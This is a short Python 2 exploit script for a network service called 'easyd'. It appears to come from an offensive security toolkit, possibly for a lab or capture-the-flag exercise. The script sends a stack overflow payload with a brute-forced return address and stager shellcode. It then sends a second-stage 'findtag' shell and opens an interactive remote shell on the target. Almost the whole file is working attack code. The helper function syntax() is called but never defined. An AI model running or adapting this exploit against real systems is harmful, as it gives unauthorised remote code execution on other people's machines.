#!/usr/bin/python
import socket
import sys
import atlasutils.hacklib as hl
import select 
import time,struct
from atlasutils import nc

"""
Exploit for easyd.  Should be easily recrafted for general purpose vulns
"""

if (len(sys.argv) < 2):
	syntax()
	sys.exit(1)

host = sys.argv.pop(1)
port = 5555
delay = 0

if len(sys.argv) > 1:
  port = int(sys.argv.pop(1))
 
if len(sys.argv) >1:
  delay = int(sys.argv.pop(1))

TIMEOUT = 20

####### Used for fuzzing
#for (my $i = 1038; ; $i++){
#######
# i = 1063 - length($string);
for ret in range(0xbfbfeb10, 0xbfbfeb11,10):			#failed attempt at bruting...
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname('tcp'))
  s.connect((host,port))
  print s.recv(65768)						#may not be necessary
  
  #shellcode = hl.genShell("bsd-findtag-stager",164, PREFIX='\x83\xec\x9c')
  shellcode = hl.genShell("bsd-findtag-stager",164,100)
  payload = shellcode + "@\x45\x71\x0a"*2 + struct.pack("L",ret)

  stage2 = hl.genShell('bsd-findtag-shell', 0,0)


  ### all sends can follow this pattern
  sys.stderr.write("* Connected.  Sending Stager...\n")
  s.sendall(payload + "\n");    # sendall is send and flush wrapped into one
  sys.stderr.write("* Stager sent... Sleeping...\n")
  sys.stderr.write("* Sending Stage 2...\n")
  s.sendall(stage2 + "\n");    # sendall is send and flush wrapped into one
  sys.stderr.write("* Stage 2 sent...\n")
  time.sleep(delay)

  # the rest of this is usable for making the findtag shell interactive...  have fun here.
  so = nc.wratchet(s, '0.0.0.0',0, host, port)
  lso = nc.wratchet()
  lso.makeFILE(sys.stdin, sys.stdout)  
  sys.stderr.write("* entering shell...\n")
  nc.manageConn(so,lso)

  s.close()

